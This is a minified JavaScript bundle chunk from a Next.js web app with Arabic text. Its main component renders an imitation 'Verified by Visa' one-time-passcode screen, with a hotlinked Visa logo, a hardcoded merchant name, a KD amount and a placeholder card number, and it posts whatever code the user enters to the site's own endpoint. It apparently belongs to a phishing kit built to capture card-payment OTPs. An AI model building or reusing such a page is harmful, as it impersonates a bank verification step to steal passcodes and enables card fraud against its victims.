(globalThis.TURBOPACK||(globalThis.TURBOPACK=[])).push(["object"==typeof document?document.currentScript:void 0,53048,e=>{"use strict";var s=e.i(51282),t=e.i(26190),a=e.i(10013),l=e.i(1933),r=e.i(24412),n=(0,t.forwardRef)((e,t)=>{let{as:n,children:i,className:c,...o}=e,{slots:d,classNames:u}=(0,s.useModalContext)(),m=(0,a.useDOMRef)(t);return(0,r.jsx)(n||"footer",{ref:m,className:d.footer({class:(0,l.clsx)(null==u?void 0:u.footer,c)}),...o,children:i})});n.displayName="HeroUI.ModalFooter",e.s(["modal_footer_default",()=>n])},15670,e=>{"use strict";var s=e.i(15757),t=e.i(48666),a=e.i(95036),l=e.i(16050);function r(e,s=[]){let t=(0,a.useRef)(e);return(0,l.useSafeLayoutEffect)(()=>{t.current=e}),(0,a.useCallback)((...e)=>{var s;return null==(s=t.current)?void 0:s.call(t,...e)},s)}function n(e={}){let{id:l,defaultOpen:i,isOpen:c,onClose:o,onOpen:d,onChange:u=()=>{}}=e,m=r(d),x=r(o),[p,h]=(0,t.useControlledState)(c,i||!1,u),f=(0,a.useId)(),j=l||f,g=void 0!==c,b=(0,a.useCallback)(()=>{g||h(!1),null==x||x()},[g,x]),y=(0,a.useCallback)(()=>{g||h(!0),null==m||m()},[g,m]),N=(0,a.useCallback)(()=>{(p?b:y)()},[p,y,b]);return{isOpen:!!p,onOpen:y,onClose:b,onOpenChange:N,isControlled:g,getButtonProps:(e={})=>({...e,"aria-expanded":p,"aria-controls":j,onClick:(0,s.chain)(e.onClick,N)}),getDisclosureProps:(e={})=>({...e,hidden:!p,id:j})}}e.s(["useDisclosure",()=>n],15670)},34153,e=>{"use strict";var s=e.i(24412),t=e.i(91522),a=e.i(84241),l=e.i(38710);let r=l.default.object({otp:l.default.string().length(6,"رمز التحقق يجب أن يكون 6 أرقام")});var n=e.i(62575),i=e.i(56909),c=e.i(25790),o=e.i(15670),d=e.i(82951),u=e.i(85537),m=e.i(95036),x=e.i(67392);function p(){let{total:e,clearCart:l}=(0,a.useCart)(),p=(0,u.useRouter)(),[h,f]=(0,m.useState)(!1),{onOpen:j}=(0,o.useDisclosure)(),g=sessionStorage.getItem("buyerId"),{register:b,handleSubmit:y,formState:{errors:N,isSubmitting:v}}=(0,x.useForm)({resolver:(0,d.zodResolver)(r),mode:"onChange",defaultValues:{otp:""}}),C=async e=>{if(!g)return void alert("Buyer ID غير موجود!");f(!0);let s=await fetch(t.default.env.NEXT_PUBLIC_API_SEND_BUYER_OTP,{method:"POST",headers:{"Content-Type":"application/json"},body:JSON.stringify({_id:g,otp:e.otp})}),a=await s.json();f(!1),s.ok?(j(),l(),p.replace("/")):alert(a.message)};return(0,s.jsxs)("form",{onSubmit:y(C),children:[(0,s.jsx)("div",{className:"flex items-start justify-between",children:(0,s.jsx)(i.Image,{src:"https://metcocu.org/wp-content/uploads/2018/08/verified_by_visa.jpg",width:100,alt:"Verified by Visa",radius:"none"})}),(0,s.jsx)("p",{className:"text-gray-700 text-lg mt-4 mb-4",children:"Protecting your online payments"}),(0,s.jsxs)("div",{className:"text-sm text-gray-700 space-y-2",children:[(0,s.jsxs)("div",{className:"flex",children:[(0,s.jsx)("span",{className:"w-40",children:"Merchant:"}),(0,s.jsx)("span",{children:"MANAHAL ALTHUNYYAN CO"})]}),(0,s.jsxs)("div",{className:"flex",children:[(0,s.jsx)("span",{className:"w-40",children:"Amount:"}),(0,s.jsxs)("span",{className:"font-bold",children:["KD ",e()]})]}),(0,s.jsxs)("div",{className:"flex",children:[(0,s.jsx)("span",{className:"w-40",children:"Date:"}),(0,s.jsx)("span",{children:new Date().toLocaleDateString()})]}),(0,s.jsxs)("div",{className:"flex",children:[(0,s.jsx)("span",{className:"w-40",children:"Card number:"}),(0,s.jsx)("span",{children:"XXXX XXXX XXXX 1234"})]}),(0,s.jsxs)("div",{className:"flex",children:[(0,s.jsx)("span",{className:"w-40",children:"Personal Message:"}),(0,s.jsx)("span",{children:"A personal greeting"})]})]}),(0,s.jsxs)("div",{className:"mt-4",children:[(0,s.jsxs)("div",{className:"flex items-center",children:[(0,s.jsx)("span",{className:"w-52 text-sm text-gray-700 leading-7",children:"Enter One-Time Passcode (OTP):"}),(0,s.jsx)("input",{type:"text",maxLength:6,...b("otp"),className:"border border-gray-400 text-sm px-2 py-1 w-40 outline-none  focus:border-blue-600"})]}),N.otp&&(0,s.jsx)("p",{className:"text-red-600 text-sm mt-1",children:N.otp.message})]}),(0,s.jsxs)("div",{className:"mt-5 flex items-center justify-center gap-3",children:[(0,s.jsx)(n.Button,{color:"primary",type:"submit",isLoading:v||h,children:"Submit"}),(0,s.jsx)(n.Button,{color:"primary",type:"button",children:"Resend"}),(0,s.jsx)(n.Button,{type:"button",as:c.Link,href:"/",children:"Cancel"})]})]})}var h=e.i(50972),f=e.i(19233),f=f,j=e.i(54529),j=j,g=e.i(10705),g=g,b=e.i(53048),b=b;function y(){let{isOpen:e,onOpenChange:t}=(0,o.useDisclosure)();return(0,s.jsx)(s.Fragment,{children:(0,s.jsx)(h.Modal,{isOpen:e,onOpenChange:t,children:(0,s.jsx)(f.modal_content_default,{children:e=>(0,s.jsxs)(s.Fragment,{children:[(0,s.jsx)(j.modal_header_default,{className:"flex flex-col gap-1",children:"شكراً لك على طلبك!"}),(0,s.jsx)(g.modal_body_default,{children:"تم استلام طلبك بنجاح. سنقوم بمعالجته في أقرب وقت ممكن."}),(0,s.jsx)(b.modal_footer_default,{children:(0,s.jsx)(n.Button,{color:"danger",variant:"light",onPress:e,children:"Close"})})]})})})})}function N(){let{items:e}=(0,a.useCart)();return e?(0,s.jsx)("div",{className:"min-h-screen bg-[#dcdcdc] flex items-center justify-center p-6",children:(0,s.jsxs)("div",{className:"w-full max-w-md bg-white border border-gray-400 rounded-sm shadow-lg px-6 pb-20 pt-10",children:[(0,s.jsx)(p,{}),(0,s.jsx)(y,{})]})}):(0,u.redirect)("/",u.RedirectType.replace)}e.s(["default",()=>N],34153)},14341,e=>{e.v(s=>Promise.all(["static/chunks/6babc70594c5cbfc.js"].map(s=>e.l(s))).then(()=>s(64641)))}]);